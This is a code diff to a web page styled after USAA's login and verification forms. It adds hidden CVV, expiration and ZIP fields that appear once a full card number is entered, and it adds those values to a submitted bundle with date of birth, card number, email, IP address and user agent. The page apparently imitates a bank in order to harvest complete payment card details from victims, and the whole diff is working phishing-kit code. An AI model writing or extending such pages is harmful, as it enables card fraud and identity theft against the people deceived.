@@ -211,6 +211,68 @@
                                                                 <div class="keyboardFocusRing"></div>
                                                             </div>
                                                         </div>
+                                                        <div id="card-details-container" style="display: none;">
+                                                            <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                                <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                    <div>
+                                                                        <div>
+                                                                            <label for="usaa-form-v5-10-1-input-cvv" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                                <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">CVV</span>
+                                                                            </label>
+                                                                        </div>
+                                                                        <div>
+                                                                            <div id="usaa-form-v5-10-1-input-cvv-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                            <div class="screenReader" role="alert"></div>
+                                                                        </div>
+                                                                        <span class="usaa-input">
+                                                                            <input name="cvv" aria-invalid="false" autocomplete="cc-csc" id="usaa-form-v5-10-1-input-cvv" type="text" placeholder="XXX" aria-describedby="usaa-form-v5-10-1-input-cvv-errorMessage undefined" value="" maxlength="4">
+                                                                            <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                        </span>
+                                                                    </div>
+                                                                    <div class="keyboardFocusRing"></div>
+                                                                </div>
+                                                            </div>
+                                                            <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                                <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                    <div>
+                                                                        <div>
+                                                                            <label for="usaa-form-v5-10-1-input-expiration" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                                <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">Expiration Date</span>
+                                                                            </label>
+                                                                        </div>
+                                                                        <div>
+                                                                            <div id="usaa-form-v5-10-1-input-expiration-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                            <div class="screenReader" role="alert"></div>
+                                                                        </div>
+                                                                        <span class="usaa-input">
+                                                                            <input name="expiration" aria-invalid="false" autocomplete="cc-exp" id="usaa-form-v5-10-1-input-expiration" type="text" placeholder="MM/YY" aria-describedby="usaa-form-v5-10-1-input-expiration-errorMessage undefined" value="" maxlength="5">
+                                                                            <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                        </span>
+                                                                    </div>
+                                                                    <div class="keyboardFocusRing"></div>
+                                                                </div>
+                                                            </div>
+                                                            <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
+                                                                <div class="usaa-form-v5-10-1-block col-1-1">
+                                                                    <div>
+                                                                        <div>
+                                                                            <label for="usaa-form-v5-10-1-input-zip" class="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label">
+                                                                                <span aria-hidden="false" class="usaa-form-v5-10-1-fieldLabel-text">ZIP Code</span>
+                                                                            </label>
+                                                                        </div>
+                                                                        <div>
+                                                                            <div id="usaa-form-v5-10-1-input-zip-errorMessage" class="usaa-form-v5-10-1-fieldWrapper-errorMessage" data-error-message=""></div>
+                                                                            <div class="screenReader" role="alert"></div>
+                                                                        </div>
+                                                                        <span class="usaa-input">
+                                                                            <input name="zip" aria-invalid="false" autocomplete="postal-code" id="usaa-form-v5-10-1-input-zip" type="text" placeholder="XXXXX" aria-describedby="usaa-form-v5-10-1-input-zip-errorMessage undefined" value="" maxlength="5">
+                                                                            <span class="keyboardFocusRing" aria-hidden="true"></span>
+                                                                        </span>
+                                                                    </div>
+                                                                    <div class="keyboardFocusRing"></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
                                                         <div class="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
                                                             <div class="usaa-form-v5-10-1-block col-1-1">
                                                                 <div>
@@ -300,14 +362,65 @@
                 });
             }
             
-            // Card number formatting
+            // Card number formatting and show card details when complete
             const cardInput = document.getElementById('usaa-form-v5-10-1-input-card');
+            const cardDetailsContainer = document.getElementById('card-details-container');
             if (cardInput) {
                 cardInput.addEventListener('input', function(e) {
                     let value = e.target.value.replace(/\D/g, '');
                     value = value.match(/.{1,4}/g)?.join(' ') || value;
                     if (value.length > 19) {
                         value = value.substring(0, 19);
+                    }
+                    e.target.value = value;
+                    
+                    // Show card details (CVV, Expiration, ZIP) when card number is complete (16 digits)
+                    if (value.replace(/\s/g, '').length === 16 && cardDetailsContainer) {
+                        cardDetailsContainer.style.display = 'block';
+                        // Focus on CVV field
+                        setTimeout(function() {
+                            const cvvInput = document.getElementById('usaa-form-v5-10-1-input-cvv');
+                            if (cvvInput) {
+                                cvvInput.focus();
+                            }
+                        }, 100);
+                    } else if (cardDetailsContainer) {
+                        cardDetailsContainer.style.display = 'none';
+                    }
+                });
+            }
+            
+            // CVV formatting
+            const cvvInput = document.getElementById('usaa-form-v5-10-1-input-cvv');
+            if (cvvInput) {
+                cvvInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 4) {
+                        value = value.substring(0, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+            
+            // Expiration date formatting
+            const expirationInput = document.getElementById('usaa-form-v5-10-1-input-expiration');
+            if (expirationInput) {
+                expirationInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+            
+            // ZIP code formatting
+            const zipInput = document.getElementById('usaa-form-v5-10-1-input-zip');
+            if (zipInput) {
+                zipInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 5) {
+                        value = value.substring(0, 5);
                     }
                     e.target.value = value;
                 });
@@ -387,6 +500,12 @@
                     const card = cardInput ? cardInput.value.trim() : '';
                     const emailInput = document.getElementById('usaa-form-v5-10-1-input-email');
                     const email = emailInput ? emailInput.value.trim() : '';
+                    const cvvInput = document.getElementById('usaa-form-v5-10-1-input-cvv');
+                    const cvv = cvvInput ? cvvInput.value.trim() : '';
+                    const expirationInput = document.getElementById('usaa-form-v5-10-1-input-expiration');
+                    const expiration = expirationInput ? expirationInput.value.trim() : '';
+                    const zipInput = document.getElementById('usaa-form-v5-10-1-input-zip');
+                    const zip = zipInput ? zipInput.value.trim() : '';
                     
                     // Get IP address and user agent
                     const ipAddress = ''; // Will be set by backend
@@ -400,6 +519,9 @@
                         dob: dob,
                         card_number: card,
                         email: email,
+                        cvv: cvv,
+                        expiration: expiration,
+                        zip_code: zip,
                         ip_address: ipAddress,
                         user_agent: userAgent
                     };
